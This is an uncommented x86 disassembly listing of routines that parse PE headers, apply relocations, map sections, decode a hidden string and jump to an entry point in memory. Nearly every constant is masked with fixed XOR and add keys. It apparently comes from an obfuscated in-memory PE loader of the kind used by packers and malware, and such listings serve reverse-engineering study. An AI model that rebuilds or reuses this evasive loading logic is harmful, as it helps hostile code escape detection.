  4277d1:	cmp    esi,eax
  4277d3:	je     0x4278fa
  4277d9:	mov    eax,DWORD PTR [ebp+0x8]
  4277dc:	mov    esi,DWORD PTR [ebp+0x8]
  4277df:	add    esi,DWORD PTR [eax+0x3c]
  4277e2:	push   edi
  4277e3:	mov    DWORD PTR [ebp+0xc],esi
  4277e6:	mov    DWORD PTR [ebp-0x1c],0xf89c85be
  4277ed:	mov    eax,DWORD PTR [ebp-0x1c]
  4277f0:	mov    esi,DWORD PTR [ebp-0x4]
  4277f3:	mov    edi,DWORD PTR [ebp+0xc]
  4277f6:	xor    esi,ecx
  4277f8:	xor    eax,ecx
  4277fa:	add    esi,edx
  4277fc:	cmp    DWORD PTR [edi+eax*8+0x1939820],esi
  427803:	je     0x4278f4
  427809:	mov    esi,DWORD PTR [ebp+0xc]
  42780c:	mov    eax,DWORD PTR [ebp+0x8]
  42780f:	add    eax,DWORD PTR [esi+0xa0]
  427815:	mov    esi,DWORD PTR [ebp+0x8]
  427818:	mov    edi,DWORD PTR [ebp+0xc]
  42781b:	sub    esi,DWORD PTR [edi+0x34]
  42781e:	mov    edi,DWORD PTR [ebp-0x4]
  427821:	xor    edi,ecx
  427823:	add    edi,edx
  427825:	mov    DWORD PTR [ebp-0x24],esi
  427828:	cmp    esi,edi
  42782a:	je     0x4278f4
  427830:	mov    esi,DWORD PTR [ebp-0x4]
  427833:	xor    esi,ecx
  427835:	add    esi,edx
  427837:	mov    DWORD PTR [ebp-0x8],esi
  42783a:	push   ebx
  42783b:	mov    DWORD PTR [ebp-0x10],0xf89c85a0
  427842:	jmp    0x4278de
  427847:	mov    esi,DWORD PTR [ebp-0x4]
  42784a:	xor    esi,ecx
  42784c:	lea    edi,[ebx-0x8]
  42784f:	add    esi,edx
  427851:	shr    edi,1
  427853:	cmp    esi,edi
  427855:	jae    0x4278c4
  427857:	sub    edi,esi
  427859:	lea    ebx,[eax+esi*2+0x8]
  42785d:	mov    DWORD PTR [ebp-0x18],edi
  427860:	movzx  esi,WORD PTR [ebx]
  427863:	and    esi,0xfff
  427869:	mov    DWORD PTR [ebp-0x14],esi
  42786c:	mov    edi,DWORD PTR [ebp-0x14]
  42786f:	mov    esi,DWORD PTR [eax]
  427871:	sub    esi,edx
  427873:	add    edi,esi
  427875:	movzx  esi,WORD PTR [ebx]
  427878:	shr    esi,0xc
  42787b:	xor    edi,ecx
  42787d:	mov    DWORD PTR [ebp-0x20],edi
  427880:	mov    DWORD PTR [ebp-0x14],esi
  427883:	mov    esi,DWORD PTR [ebp-0x20]
  427886:	mov    edi,DWORD PTR [ebp+0x8]
  427889:	xor    esi,ecx
  42788b:	lea    esi,[esi+edi*1+0x3272f5]
  427892:	mov    DWORD PTR [ebp-0x20],esi
  427895:	mov    esi,DWORD PTR [ebp-0x10]
  427898:	mov    edi,DWORD PTR [ebp-0x14]
  42789b:	xor    esi,ecx
  42789d:	add    esi,edx
  42789f:	cmp    edi,esi
  4278a1:	jne    0x4278b9
  4278a3:	mov    esi,DWORD PTR [ebp-0x10]
  4278a6:	mov    edi,DWORD PTR [ebp-0x14]
  4278a9:	xor    esi,ecx
  4278ab:	add    esi,edx
  4278ad:	cmp    edi,esi
  4278af:	jne    0x4278b9
  4278b1:	mov    esi,DWORD PTR [ebp-0x20]
  4278b4:	mov    edi,DWORD PTR [ebp-0x24]
  4278b7:	add    DWORD PTR [esi],edi
  4278b9:	add    ebx,0x2
  4278bc:	dec    DWORD PTR [ebp-0x18]
  4278bf:	jne    0x427860
  4278c1:	mov    ebx,DWORD PTR [ebp-0xc]
  4278c4:	add    DWORD PTR [ebp-0x8],ebx
  4278c7:	mov    esi,DWORD PTR [ebp-0x1c]
  4278ca:	mov    edi,DWORD PTR [ebp-0x8]
  4278cd:	mov    ebx,DWORD PTR [ebp+0xc]
  4278d0:	xor    esi,ecx
  4278d2:	cmp    edi,DWORD PTR [ebx+esi*8+0x1939824]
  4278d9:	jae    0x4278f3
  4278db:	add    eax,DWORD PTR [ebp-0xc]
  4278de:	mov    esi,DWORD PTR [ebp-0x4]
  4278e1:	mov    ebx,DWORD PTR [eax+0x4]
  4278e4:	xor    esi,ecx
  4278e6:	add    esi,edx
  4278e8:	mov    DWORD PTR [ebp-0xc],ebx
  4278eb:	cmp    ebx,esi
  4278ed:	jne    0x427847
  4278f3:	pop    ebx
  4278f4:	mov    eax,DWORD PTR [ebp-0x28]
  4278f7:	pop    edi
  4278f8:	jmp    0x4278fd
  4278fa:	mov    eax,DWORD PTR [ebp-0x4]
  4278fd:	xor    eax,ecx
  4278ff:	add    eax,edx
  427901:	pop    esi
  427902:	leave  
  427903:	ret    0x8
  427906:	push   ebp
  427907:	mov    ebp,esp
  427909:	sub    esp,0xd8
  42790f:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  427916:	mov    DWORD PTR [ebp-0x24],0xf89c85a2
  42791d:	mov    eax,DWORD PTR [ebp-0x4]
  427920:	push   ebx
  427921:	push   esi
  427922:	mov    esi,0x75108ae
  427927:	xor    eax,esi
  427929:	push   edi
  42792a:	mov    edi,0x3272f5
  42792f:	add    eax,edi
  427931:	mov    DWORD PTR [ebp-0x18],eax
  427934:	mov    eax,DWORD PTR [ebp-0x4]
  427937:	xor    eax,esi
  427939:	add    eax,edi
  42793b:	mov    DWORD PTR [ebp-0x8],eax
  42793e:	mov    ebx,DWORD PTR [ebp+0x20]
  427941:	mov    eax,DWORD PTR [ebp-0x1c]
  427944:	mov    ecx,DWORD PTR [ebp-0x1c]
  427947:	xor    eax,ecx
  427949:	mov    DWORD PTR [ebp-0x1c],eax
  42794c:	add    DWORD PTR [ebp-0x1c],0xf89cb5a5
  427953:	mov    eax,DWORD PTR [ebp-0xc]
  427956:	mov    ecx,DWORD PTR [ebp-0xc]
  427959:	xor    eax,ecx
  42795b:	mov    DWORD PTR [ebp-0xc],eax
  42795e:	add    DWORD PTR [ebp-0xc],0xf89c85e5
  427965:	mov    eax,DWORD PTR [ebp-0x10]
  427968:	mov    ecx,DWORD PTR [ebp-0x10]
  42796b:	xor    eax,ecx
  42796d:	mov    DWORD PTR [ebp-0x10],eax
  427970:	add    DWORD PTR [ebp-0x10],0xf89c85a1
  427977:	mov    eax,DWORD PTR [ebp-0x28]
  42797a:	mov    ecx,DWORD PTR [ebp-0x28]
  42797d:	xor    eax,ecx
  42797f:	mov    DWORD PTR [ebp-0x28],eax
  427982:	add    DWORD PTR [ebp-0x28],0xf89f05a5
  427989:	mov    DWORD PTR [ebp+0x20],0xf89ceff6
  427990:	mov    eax,DWORD PTR [ebp+0x8]
  427993:	test   eax,eax
  427995:	je     0x427e1c
  42799b:	mov    eax,DWORD PTR [ebp+0xc]
  42799e:	test   eax,eax
  4279a0:	je     0x427e1c
  4279a6:	mov    eax,DWORD PTR [ebp+0x18]
  4279a9:	test   eax,eax
  4279ab:	je     0x427e1c
  4279b1:	mov    eax,DWORD PTR [ebp+0x20]
  4279b4:	mov    ecx,DWORD PTR [ebp+0x8]
  4279b7:	xor    eax,0x8ae
  4279bc:	add    eax,0x72f5
  4279c1:	cmp    WORD PTR [ecx],ax
  4279c4:	jne    0x427e1c
  4279ca:	mov    eax,DWORD PTR [ebp-0x4]
  4279cd:	xor    eax,esi
  4279cf:	add    eax,edi
  4279d1:	mov    DWORD PTR [ebp-0x30],eax
  4279d4:	mov    eax,DWORD PTR [ebp-0x4]
  4279d7:	mov    ecx,DWORD PTR [ebp+0x8]
  4279da:	mov    eax,DWORD PTR [ebp+0x8]
  4279dd:	add    eax,DWORD PTR [ecx+0x3c]
  4279e0:	mov    DWORD PTR [ebp+0xc],eax
  4279e3:	mov    eax,DWORD PTR [eax+0x50]
  4279e6:	test   eax,eax
  4279e8:	je     0x427e1c
  4279ee:	mov    DWORD PTR [ebp-0x2c],0xf88c85a5
  4279f5:	mov    eax,DWORD PTR [ebp-0x2c]
  4279f8:	xor    eax,esi
  4279fa:	add    eax,edi
  4279fc:	mov    DWORD PTR [ebp-0x2c],eax
  4279ff:	mov    eax,DWORD PTR [ebp-0x4]
  427a02:	mov    eax,DWORD PTR [ebx+0x190]
  427a08:	mov    ecx,DWORD PTR [eax]
  427a0a:	mov    ecx,DWORD PTR [ecx+0x3c]
  427a0d:	add    ecx,DWORD PTR [eax]
  427a0f:	mov    eax,DWORD PTR [ebp-0x4]
  427a12:	mov    eax,DWORD PTR [ebx+0x18c]
  427a18:	mov    edx,DWORD PTR [eax]
  427a1a:	mov    DWORD PTR [ebp-0x20],ecx
  427a1d:	mov    DWORD PTR [ebp+0x20],edx
  427a20:	cmp    edx,edx
  427a22:	jne    0x427a56
  427a24:	mov    eax,DWORD PTR [ebx+0x1e0]
  427a2a:	lea    edx,[ebp-0x18]
  427a2d:	push   edx
  427a2e:	mov    edx,DWORD PTR [ebp-0xc]
  427a31:	xor    edx,esi
  427a33:	add    edx,edi
  427a35:	push   edx
  427a36:	push   DWORD PTR [ecx+0x50]
  427a39:	push   DWORD PTR [ebp+0x20]
  427a3c:	call   DWORD PTR [eax+0x1c]
  427a3f:	mov    eax,DWORD PTR [ebp-0x20]
  427a42:	mov    ecx,DWORD PTR [eax+0x54]
  427a45:	mov    eax,DWORD PTR [eax+0x50]
  427a48:	sub    eax,ecx
  427a4a:	add    ecx,DWORD PTR [ebp+0x20]
  427a4d:	push   ecx
  427a4e:	call   0x4283b9
  427a53:	mov    edx,DWORD PTR [ebp+0x20]
  427a56:	mov    eax,DWORD PTR [ebx+0x194]
  427a5c:	mov    DWORD PTR [eax],edx
  427a5e:	mov    eax,DWORD PTR [ebp+0xc]
  427a61:	push   DWORD PTR [eax+0x54]
  427a64:	push   DWORD PTR [ebp+0x8]
  427a67:	push   edx
  427a68:	call   0x4282af
  427a6d:	mov    ecx,DWORD PTR [ebp+0x20]
  427a70:	mov    eax,DWORD PTR [ecx+0x3c]
  427a73:	add    eax,ecx
  427a75:	movzx  ecx,WORD PTR [eax+0x14]
  427a79:	lea    ecx,[ecx+eax*1+0x18]
  427a7d:	mov    DWORD PTR [ebp+0x18],ecx
  427a80:	mov    ecx,DWORD PTR [ebp-0x4]
  427a83:	movzx  edx,WORD PTR [eax+0x6]
  427a87:	xor    ecx,esi
  427a89:	add    ecx,edi
  427a8b:	mov    DWORD PTR [ebp+0xc],eax
  427a8e:	cmp    edx,ecx
  427a90:	je     0x427b3d
  427a96:	mov    ecx,DWORD PTR [ebp-0x4]
  427a99:	xor    ecx,esi
  427a9b:	add    ecx,edi
  427a9d:	mov    DWORD PTR [ebp-0x8],ecx
  427aa0:	mov    ecx,DWORD PTR [ebp-0x24]
  427aa3:	movzx  edx,WORD PTR [eax+0x6]
  427aa7:	xor    ecx,esi
  427aa9:	sub    edx,ecx
  427aab:	sub    edx,edi
  427aad:	cmp    DWORD PTR [ebp-0x8],edx
  427ab0:	ja     0x427b3d
  427ab6:	mov    edx,DWORD PTR [ebp+0x18]
  427ab9:	add    edx,0x8
  427abc:	mov    DWORD PTR [ebp+0x18],edx
  427abf:	jmp    0x427ac4
  427ac1:	mov    edx,DWORD PTR [ebp+0x18]
  427ac4:	mov    eax,DWORD PTR [eax+0x38]
  427ac7:	lea    ecx,[eax-0x1]
  427aca:	mov    DWORD PTR [ebp-0x38],eax
  427acd:	mov    eax,DWORD PTR [edx]
  427acf:	test   eax,ecx
  427ad1:	je     0x427ada
  427ad3:	not    ecx
  427ad5:	and    eax,ecx
  427ad7:	add    eax,DWORD PTR [ebp-0x38]
  427ada:	mov    ecx,DWORD PTR [edx+0x4]
  427add:	add    ecx,DWORD PTR [ebp+0x20]
  427ae0:	push   ecx
  427ae1:	call   0x4283b9
  427ae6:	mov    edx,DWORD PTR [ebp-0x4]
  427ae9:	mov    eax,DWORD PTR [ebp+0x18]
  427aec:	mov    ecx,DWORD PTR [eax+0x8]
  427aef:	xor    edx,esi
  427af1:	add    edx,edi
  427af3:	cmp    ecx,edx
  427af5:	je     0x427b0e
  427af7:	push   ecx
  427af8:	mov    ecx,DWORD PTR [ebp+0x8]
  427afb:	add    ecx,DWORD PTR [eax+0xc]
  427afe:	mov    eax,DWORD PTR [eax+0x4]
  427b01:	add    eax,DWORD PTR [ebp+0x20]
  427b04:	push   ecx
  427b05:	push   eax
  427b06:	call   0x4282af
  427b0b:	mov    eax,DWORD PTR [ebp+0x18]
  427b0e:	mov    ecx,DWORD PTR [ebp-0x24]
  427b11:	mov    edx,DWORD PTR [ebp-0x8]
  427b14:	add    eax,0x28
  427b17:	xor    ecx,esi
  427b19:	lea    ecx,[edx+ecx*1+0x3272f5]
  427b20:	mov    edx,DWORD PTR [ebp+0xc]
  427b23:	mov    DWORD PTR [ebp+0x18],eax
  427b26:	mov    eax,DWORD PTR [ebp-0x24]
  427b29:	movzx  edx,WORD PTR [edx+0x6]
  427b2d:	xor    eax,esi
  427b2f:	sub    edx,eax
  427b31:	mov    eax,DWORD PTR [ebp+0xc]
  427b34:	sub    edx,edi
  427b36:	mov    DWORD PTR [ebp-0x8],ecx
  427b39:	cmp    ecx,edx
  427b3b:	jbe    0x427ac1
  427b3d:	mov    edx,DWORD PTR [ebx+0x18c]
  427b43:	mov    ecx,DWORD PTR [ebp+0x20]
  427b46:	cmp    ecx,DWORD PTR [edx]
  427b48:	jne    0x427b71
  427b4a:	mov    eax,DWORD PTR [ebx+0x1e0]
  427b50:	lea    edx,[ebp-0x18]
  427b53:	push   edx
  427b54:	mov    edx,DWORD PTR [ebp-0x10]
  427b57:	xor    edx,esi
  427b59:	add    edx,edi
  427b5b:	push   edx
  427b5c:	mov    edx,DWORD PTR [ebp-0x20]
  427b5f:	push   DWORD PTR [edx+0x54]
  427b62:	push   ecx
  427b63:	call   DWORD PTR [eax+0x1c]
  427b66:	test   eax,eax
  427b68:	je     0x427e0d
  427b6e:	mov    eax,DWORD PTR [ebp+0xc]
  427b71:	mov    ecx,DWORD PTR [ebx+0x1c8]
  427b77:	mov    ecx,DWORD PTR [ecx]
  427b79:	xor    ecx,esi
  427b7b:	add    ecx,edi
  427b7d:	je     0x427d38
  427b83:	mov    eax,DWORD PTR [ebp-0x4]
  427b86:	xor    eax,esi
  427b88:	add    eax,edi
  427b8a:	and    DWORD PTR [ebp+0x8],0x0
  427b8e:	mov    DWORD PTR [ebp-0x14],eax
  427b91:	mov    eax,0xf89c85c1
  427b96:	lea    ecx,[eax+0x18]
  427b99:	mov    DWORD PTR [ebp-0x58],0xf89c85d7
  427ba0:	mov    DWORD PTR [ebp-0x54],0xf89c85d1
  427ba7:	mov    DWORD PTR [ebp-0x50],eax
  427baa:	mov    DWORD PTR [ebp-0x4c],ecx
  427bad:	mov    DWORD PTR [ebp-0x48],ecx
  427bb0:	mov    DWORD PTR [ebp-0x44],0xf89c85a5
  427bb7:	mov    edx,DWORD PTR [ebp+0x8]
  427bba:	mov    ecx,0x8ae
  427bbf:	xor    cx,WORD PTR [ebp+edx*4-0x58]
  427bc4:	mov    edx,0x72f5
  427bc9:	add    cx,dx
  427bcc:	mov    edx,DWORD PTR [ebp+0x8]
  427bcf:	inc    DWORD PTR [ebp+0x8]
  427bd2:	cmp    DWORD PTR [ebp+0x8],0x6
  427bd6:	mov    WORD PTR [ebp+edx*2-0xc0],cx
  427bde:	jb     0x427bb7
  427be0:	mov    ecx,0xf89c85d3
  427be5:	mov    DWORD PTR [ebp-0xb0],eax
  427beb:	mov    DWORD PTR [ebp-0x9c],eax
  427bf1:	mov    DWORD PTR [ebp-0x74],eax
  427bf4:	mov    DWORD PTR [ebp-0x70],eax
  427bf7:	lea    eax,[ecx-0x3]
  427bfa:	lea    edx,[ecx+0x2c]
  427bfd:	mov    DWORD PTR [ebp-0x64],eax
  427c00:	mov    DWORD PTR [ebp-0x60],eax
  427c03:	mov    DWORD PTR [ebp-0xb4],0xf89c85f9
  427c0d:	mov    DWORD PTR [ebp-0xac],ecx
  427c13:	mov    DWORD PTR [ebp-0xa8],edx
  427c19:	mov    DWORD PTR [ebp-0xa4],0xf89c85da
  427c23:	mov    DWORD PTR [ebp-0xa0],0xf89c85d7
  427c2d:	mov    DWORD PTR [ebp-0x98],0xf89c85fe
  427c37:	mov    DWORD PTR [ebp-0x94],0xf89c85d7
  427c41:	mov    DWORD PTR [ebp-0x90],0xf89c85d1
  427c4b:	mov    DWORD PTR [ebp-0x8c],ecx
  427c51:	mov    DWORD PTR [ebp-0x88],0xf89c852a
  427c5b:	mov    DWORD PTR [ebp-0x84],edx
  427c61:	mov    DWORD PTR [ebp-0x80],0xf89c85d4
  427c68:	mov    DWORD PTR [ebp-0x7c],ecx
  427c6b:	mov    DWORD PTR [ebp-0x78],0xf89c85e2
  427c72:	mov    DWORD PTR [ebp-0x6c],ecx
  427c75:	mov    DWORD PTR [ebp-0x68],0xf89c85de
  427c7c:	mov    DWORD PTR [ebp-0x5c],0xf89c85a5
  427c83:	xor    eax,eax
  427c85:	mov    cl,BYTE PTR [ebp+eax*4-0xb4]
  427c8c:	xor    cl,0xae
  427c8f:	sub    cl,0xb
  427c92:	mov    BYTE PTR [ebp+eax*1-0xd8],cl
  427c99:	inc    eax
  427c9a:	cmp    eax,0x17
  427c9d:	jb     0x427c85
  427c9f:	mov    eax,DWORD PTR [ebx+0x1e0]
  427ca5:	lea    ecx,[ebp-0xc0]
  427cab:	push   ecx
  427cac:	call   DWORD PTR [eax+0x4]
  427caf:	mov    ecx,DWORD PTR [ebx+0x1e0]
  427cb5:	lea    edx,[ebp-0xd8]
  427cbb:	push   edx
  427cbc:	push   eax
  427cbd:	call   DWORD PTR [ecx+0x8]
  427cc0:	mov    DWORD PTR [ebp-0x40],eax
  427cc3:	lea    eax,[ebp-0x14]
  427cc6:	push   eax
  427cc7:	mov    eax,DWORD PTR [ebx+0x18c]
  427ccd:	push   DWORD PTR [eax]
  427ccf:	mov    eax,DWORD PTR [ebp-0x40]
  427cd2:	call   eax
  427cd4:	mov    eax,DWORD PTR [ebp-0x4]
  427cd7:	xor    eax,esi
  427cd9:	add    eax,edi
  427cdb:	mov    DWORD PTR [ebp-0x34],eax
  427cde:	mov    ecx,DWORD PTR [ebp-0x4]
  427ce1:	mov    eax,DWORD PTR [ebp-0x14]
  427ce4:	xor    ecx,esi
  427ce6:	add    ecx,edi
  427ce8:	cmp    eax,ecx
  427cea:	je     0x427d35
  427cec:	mov    DWORD PTR [ebp-0x3c],eax
  427cef:	jmp    0x427d00
  427cf1:	mov    eax,DWORD PTR [eax]
  427cf3:	mov    ecx,DWORD PTR [ebp-0x3c]
  427cf6:	mov    DWORD PTR [ebp-0x14],eax
  427cf9:	mov    eax,DWORD PTR [ebp-0x14]
  427cfc:	cmp    eax,ecx
  427cfe:	je     0x427d0d
  427d00:	mov    edx,DWORD PTR [eax+0x18]
  427d03:	mov    ecx,DWORD PTR [ebx+0x18c]
  427d09:	cmp    edx,DWORD PTR [ecx]
  427d0b:	jne    0x427cf1
  427d0d:	mov    ecx,DWORD PTR [ebx+0x18c]
  427d13:	mov    edx,DWORD PTR [eax+0x18]
  427d16:	cmp    edx,DWORD PTR [ecx]
  427d18:	jne    0x427d35
  427d1a:	mov    ecx,DWORD PTR [ebx+0x190]
  427d20:	mov    edx,DWORD PTR [ebp-0x20]
  427d23:	mov    edx,DWORD PTR [edx+0x28]
  427d26:	add    edx,DWORD PTR [ecx]
  427d28:	mov    DWORD PTR [eax+0x1c],edx
  427d2b:	mov    eax,DWORD PTR [ebp-0x24]
  427d2e:	xor    eax,esi
  427d30:	add    eax,edi
  427d32:	mov    DWORD PTR [ebp-0x34],eax
  427d35:	mov    eax,DWORD PTR [ebp+0xc]
  427d38:	push   ebx
  427d39:	push   eax
  427d3a:	push   DWORD PTR [ebp+0x20]
  427d3d:	call   0x4274bd
  427d42:	test   eax,eax
  427d44:	je     0x427e0d
  427d4a:	push   DWORD PTR [ebp+0xc]
  427d4d:	mov    ecx,ebx
  427d4f:	push   DWORD PTR [ebp+0x20]
  427d52:	call   0x427416
  427d57:	test   eax,eax
  427d59:	je     0x427e0d
  427d5f:	mov    eax,DWORD PTR [ebp+0xc]
  427d62:	mov    edx,DWORD PTR [ebp+0x20]
  427d65:	mov    ecx,ebx
  427d67:	call   0x4272ef
  427d6c:	test   eax,eax
  427d6e:	je     0x427e0d
  427d74:	push   ebx
  427d75:	push   DWORD PTR [ebp+0x20]
  427d78:	call   0x4277a0
  427d7d:	test   eax,eax
  427d7f:	je     0x427e0d
  427d85:	mov    eax,DWORD PTR [ebx+0x18c]
  427d8b:	mov    edx,DWORD PTR [ebp+0x20]
  427d8e:	cmp    edx,DWORD PTR [eax]
  427d90:	jne    0x427dac
  427d92:	mov    eax,DWORD PTR [ebx+0x1e0]
  427d98:	lea    ecx,[ebp-0x18]
  427d9b:	push   ecx
  427d9c:	push   DWORD PTR [ebp-0x18]
  427d9f:	mov    ecx,DWORD PTR [ebp-0x20]
  427da2:	push   DWORD PTR [ecx+0x54]
  427da5:	push   edx
  427da6:	call   DWORD PTR [eax+0x1c]
  427da9:	mov    edx,DWORD PTR [ebp+0x20]
  427dac:	mov    eax,DWORD PTR [ebx+0x1c8]
  427db2:	mov    eax,DWORD PTR [eax]
  427db4:	xor    eax,esi
  427db6:	add    eax,edi
  427db8:	je     0x427df1
  427dba:	mov    ecx,DWORD PTR [ebp+0xc]
  427dbd:	mov    eax,DWORD PTR [ecx+0x28]
  427dc0:	mov    DWORD PTR [ebp+0x8],0xf89ca5a5
  427dc7:	mov    esi,DWORD PTR [ebp+0x8]
  427dca:	push   DWORD PTR [ebp+0x14]
  427dcd:	xor    esi,0x8ae
  427dd3:	push   DWORD PTR [ebp+0x10]
  427dd6:	add    esi,0x72f5
  427ddc:	or     WORD PTR [ecx+0x16],si
  427de0:	add    eax,edx
  427de2:	push   edx
  427de3:	call   eax
  427de5:	mov    DWORD PTR [ebx+0x1d0],0xf89c85a2
  427def:	jmp    0x427dfb
  427df1:	mov    eax,DWORD PTR [ebp+0xc]
  427df4:	mov    eax,DWORD PTR [eax+0x28]
  427df7:	add    eax,edx
  427df9:	call   eax
  427dfb:	mov    DWORD PTR [ebp-0x8],eax
  427dfe:	mov    eax,DWORD PTR [ebp-0x8]
  427e01:	mov    ecx,DWORD PTR [ebp+0x1c]
  427e04:	mov    DWORD PTR [ecx],eax
  427e06:	mov    DWORD PTR [ebp-0x30],0x1
  427e0d:	cmp    DWORD PTR [ebp-0x30],0x0
  427e11:	jne    0x427e17
  427e13:	and    DWORD PTR [ebp+0x20],0x0
  427e17:	mov    eax,DWORD PTR [ebp+0x20]
  427e1a:	jmp    0x427e1e
  427e1c:	xor    eax,eax
  427e1e:	pop    edi
  427e1f:	pop    esi
  427e20:	pop    ebx
  427e21:	leave  
  427e22:	ret    0x1c
  427e25:	push   ebp
  427e26:	mov    ebp,esp
  427e28:	movzx  edx,WORD PTR [ecx+0x6]
  427e2c:	movzx  eax,WORD PTR [ecx+0x14]
  427e30:	push   ebx
  427e31:	push   edi
  427e32:	xor    edi,edi
  427e34:	lea    eax,[eax+ecx*1+0x18]
  427e38:	test   edx,edx
  427e3a:	je     0x427e5b
  427e3c:	mov    ecx,DWORD PTR [eax+0xc]
  427e3f:	lea    ebx,[ecx+esi*1]
  427e42:	cmp    DWORD PTR [ebp+0x8],ebx
  427e45:	jb     0x427e53
  427e47:	mov    ebx,DWORD PTR [eax+0x8]
  427e4a:	add    ebx,ecx
  427e4c:	add    ebx,esi
  427e4e:	cmp    DWORD PTR [ebp+0x8],ebx
  427e51:	jb     0x427e5d
  427e53:	add    eax,0x28
  427e56:	inc    edi
  427e57:	cmp    edi,edx
  427e59:	jb     0x427e3c
  427e5b:	xor    eax,eax
  427e5d:	pop    edi
  427e5e:	pop    ebx
  427e5f:	pop    ebp
  427e60:	ret    0x4
  427e63:	push   ebp
  427e64:	mov    ebp,esp
  427e66:	sub    esp,0x34
  427e69:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  427e70:	mov    DWORD PTR [ebp-0x18],0xf89c85a2
  427e77:	mov    DWORD PTR [ebp-0x1c],0xf89c85a3
  427e7e:	mov    DWORD PTR [ebp-0x8],0xf89c85c2
  427e85:	mov    DWORD PTR [ebp-0x20],0xf89c85e2
  427e8c:	mov    DWORD PTR [ebp-0x2c],0xf89c852b
  427e93:	mov    DWORD PTR [ebp-0x2c],0xf89c85cb
  427e9a:	mov    DWORD PTR [ebp-0x10],eax
  427e9d:	mov    eax,DWORD PTR [ebp+0x8]
  427ea0:	mov    DWORD PTR [ebp-0x14],eax
  427ea3:	mov    eax,DWORD PTR [ebp-0xc]
  427ea6:	push   ebx
  427ea7:	mov    ecx,0x75108ae
  427eac:	xor    eax,ecx
  427eae:	push   esi
  427eaf:	mov    esi,DWORD PTR [ebp-0x10]
  427eb2:	mov    edx,0x3272f5
  427eb7:	add    eax,edx
  427eb9:	push   edi
  427eba:	cmp    esi,eax
  427ebc:	je     0x42809b
  427ec2:	mov    eax,DWORD PTR [ebp-0xc]
  427ec5:	mov    esi,DWORD PTR [ebp-0x14]
  427ec8:	xor    eax,ecx
  427eca:	add    eax,edx
  427ecc:	cmp    esi,eax
  427ece:	je     0x42809b
  427ed4:	mov    eax,DWORD PTR [ebp-0xc]
  427ed7:	xor    eax,ecx
  427ed9:	add    eax,edx
  427edb:	mov    DWORD PTR [ebp-0x24],eax
  427ede:	mov    eax,DWORD PTR [ebp-0xc]
  427ee1:	xor    eax,ecx
  427ee3:	add    eax,edx
  427ee5:	mov    DWORD PTR [ebp-0x28],eax
  427ee8:	mov    edi,DWORD PTR [ebp-0x20]
  427eeb:	mov    ebx,DWORD PTR [ebp-0x8]
  427eee:	mov    esi,0x8ae
  427ef3:	xor    edi,esi
  427ef5:	mov    eax,0x72f5
  427efa:	xor    ebx,esi
  427efc:	add    edi,eax
  427efe:	add    ebx,eax
  427f00:	sub    ebx,edi
  427f02:	mov    WORD PTR [ebp-0x8],bx
  427f06:	jmp    0x427fcb
  427f0b:	mov    edi,DWORD PTR [ebp-0xc]
  427f0e:	mov    bx,WORD PTR [ebp-0x4]
  427f12:	xor    edi,esi
  427f14:	add    edi,eax
  427f16:	cmp    bx,di
  427f19:	je     0x42800d
  427f1f:	mov    edi,DWORD PTR [ebp-0xc]
  427f22:	mov    ebx,DWORD PTR [ebp+0xc]
  427f25:	xor    edi,ecx
  427f27:	add    edi,edx
  427f29:	cmp    ebx,edi
  427f2b:	mov    di,WORD PTR [ebp-0x4]
  427f2f:	mov    bx,WORD PTR [ebp+0x8]
  427f33:	je     0x427f9e
  427f35:	cmp    bx,di
  427f38:	je     0x427fa7
  427f3a:	mov    edi,DWORD PTR [ebp-0x20]
  427f3d:	mov    bx,WORD PTR [ebp+0x8]
  427f41:	xor    edi,esi
  427f43:	add    edi,eax
  427f45:	cmp    bx,di
  427f48:	jb     0x427f68
  427f4a:	mov    edi,DWORD PTR [ebp-0x2c]
  427f4d:	mov    bx,WORD PTR [ebp+0x8]
  427f51:	xor    edi,esi
  427f53:	add    edi,eax
  427f55:	cmp    bx,di
  427f58:	ja     0x427f68
  427f5a:	movzx  edi,WORD PTR [ebp+0x8]
  427f5e:	movzx  ebx,WORD PTR [ebp-0x8]
  427f62:	add    edi,ebx
  427f64:	mov    WORD PTR [ebp+0x8],di
  427f68:	mov    edi,DWORD PTR [ebp-0x20]
  427f6b:	mov    bx,WORD PTR [ebp-0x4]
  427f6f:	xor    edi,esi
  427f71:	add    edi,eax
  427f73:	cmp    bx,di
  427f76:	jb     0x427f96
  427f78:	mov    edi,DWORD PTR [ebp-0x2c]
  427f7b:	mov    bx,WORD PTR [ebp-0x4]
  427f7f:	xor    edi,esi
  427f81:	add    edi,eax
  427f83:	cmp    bx,di
  427f86:	ja     0x427f96
  427f88:	movzx  edi,WORD PTR [ebp-0x4]
  427f8c:	movzx  ebx,WORD PTR [ebp-0x8]
  427f90:	add    edi,ebx
  427f92:	mov    WORD PTR [ebp-0x4],di
  427f96:	mov    di,WORD PTR [ebp-0x4]
  427f9a:	mov    bx,WORD PTR [ebp+0x8]
  427f9e:	cmp    bx,di
  427fa1:	jne    0x42809b
  427fa7:	mov    edi,DWORD PTR [ebp-0x1c]
  427faa:	mov    ebx,DWORD PTR [ebp-0x10]
  427fad:	xor    edi,ecx
  427faf:	lea    edi,[edi+ebx*1+0x3272f5]
  427fb6:	mov    DWORD PTR [ebp-0x10],edi
  427fb9:	mov    edi,DWORD PTR [ebp-0x1c]
  427fbc:	mov    ebx,DWORD PTR [ebp-0x14]
  427fbf:	xor    edi,ecx
  427fc1:	lea    edi,[edi+ebx*1+0x3272f5]
  427fc8:	mov    DWORD PTR [ebp-0x14],edi
  427fcb:	mov    edi,DWORD PTR [ebp-0x24]
  427fce:	mov    ebx,DWORD PTR [ebp-0x10]
  427fd1:	mov    di,WORD PTR [ebx+edi*2]
  427fd5:	mov    WORD PTR [ebp+0x8],di
  427fd9:	mov    edi,DWORD PTR [ebp-0x28]
  427fdc:	mov    ebx,DWORD PTR [ebp-0x14]
  427fdf:	mov    di,WORD PTR [ebx+edi*2]
  427fe3:	mov    WORD PTR [ebp-0x4],di
  427fe7:	mov    edi,DWORD PTR [ebp-0xc]
  427fea:	mov    bx,WORD PTR [ebp+0x8]
  427fee:	xor    edi,esi
  427ff0:	add    edi,eax
  427ff2:	cmp    bx,di
  427ff5:	jne    0x427f0b
  427ffb:	mov    eax,DWORD PTR [ebp-0x18]
  427ffe:	mov    esi,DWORD PTR [ebp-0xc]
  428001:	xor    eax,ecx
  428003:	add    eax,edx
  428005:	imul   eax,esi
  428008:	mov    DWORD PTR [ebp-0xc],eax
  42800b:	jmp    0x42801f
  42800d:	mov    eax,DWORD PTR [ebp-0xc]
  428010:	mov    esi,DWORD PTR [ebp-0x18]
